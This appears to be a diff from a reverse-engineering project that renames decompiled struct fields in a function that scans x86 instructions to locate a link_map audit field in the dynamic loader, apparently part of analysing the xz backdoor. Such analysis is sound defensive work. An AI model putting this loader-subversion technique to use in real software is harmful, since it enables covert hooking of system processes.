@@ -77,34 +77,37 @@ BOOL find_link_map_l_audit_any_plt
            (telemetry_ok = x86_dasm(&insn_ctx,(u8 *)audit_func_cursor,(u8 *)audit_func_end),
            decoded_insn_size = insn_ctx.instruction_size, telemetry_ok != FALSE))) {
       if ((insn_ctx._40_4_ == 0x1036) &&
-         ((((ushort)insn_ctx.prefix._0_4_ & 0x140) == 0x140 &&
-          ((byte)(insn_ctx.prefix._13_1_ - 1) < 2)))) {
+         ((((ushort)insn_ctx.prefix.flags_u32 & 0x140) == 0x140 &&
+          ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)))) {
         mask_reg_index = 0;
-        if ((insn_ctx.prefix._0_4_ & 0x40) == 0) {
+        if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
           l_name_reg_index = 0;
-          if ((((insn_ctx.prefix._0_4_ & 0x1040) != 0) &&
-              (l_name_reg_index = insn_ctx.prefix.decoded.flags2 & 0x10, (insn_ctx.prefix._0_4_ & 0x1000) != 0)
-              ) && (l_name_reg_index = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix._0_4_ & 0x20) != 0)) {
-            l_name_reg_index = insn_ctx.mov_imm_reg_index | ((byte)insn_ctx.prefix.decoded.rex & 1) << 3;
+          if ((((insn_ctx.prefix.flags_u32 & 0x1040) != 0) &&
+              (l_name_reg_index = insn_ctx.prefix.decoded.flags2 & 0x10,
+              (insn_ctx.prefix.flags_u32 & 0x1000) != 0)) &&
+             (l_name_reg_index = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
+            l_name_reg_index = insn_ctx.mov_imm_reg_index | (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
           }
         }
         else {
           l_name_reg_index = insn_ctx.prefix.decoded.flags & 0x20;
-          if ((insn_ctx.prefix._0_4_ & 0x20) == 0) {
-            mask_reg_index = insn_ctx.prefix._15_1_;
-            if ((insn_ctx.prefix._0_4_ & 0x1040) != 0) {
-              l_name_reg_index = insn_ctx.prefix._14_1_;
+          if ((insn_ctx.prefix.flags_u32 & 0x20) == 0) {
+            mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm;
+            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+              l_name_reg_index = insn_ctx.prefix.modrm_bytes.modrm_reg;
             }
           }
           else {
-            mask_reg_index = insn_ctx.prefix._15_1_ | (char)insn_ctx.prefix.decoded.rex * '\b' & 8U;
+            mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm |
+                     insn_ctx.prefix.modrm_bytes.rex_byte * '\b' & 8;
             l_name_reg_index = 0;
-            if ((insn_ctx.prefix._0_4_ & 0x1040) != 0) {
-              l_name_reg_index = (char)insn_ctx.prefix.decoded.rex * '\x02' & 8U | insn_ctx.prefix._14_1_;
+            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+              l_name_reg_index = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8 |
+                      insn_ctx.prefix.modrm_bytes.modrm_reg;
             }
           }
         }
-        if ((insn_ctx.prefix._0_4_ & 0x100) != 0) {
+        if ((insn_ctx.prefix.flags_u32 & 0x100) != 0) {
           lea_operand_disp = (u8 *)insn_ctx.mem_disp;
           if (((uint)insn_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
             lea_operand_disp = insn_ctx.instruction + (long)(insn_ctx.mem_disp + insn_ctx.instruction_size);
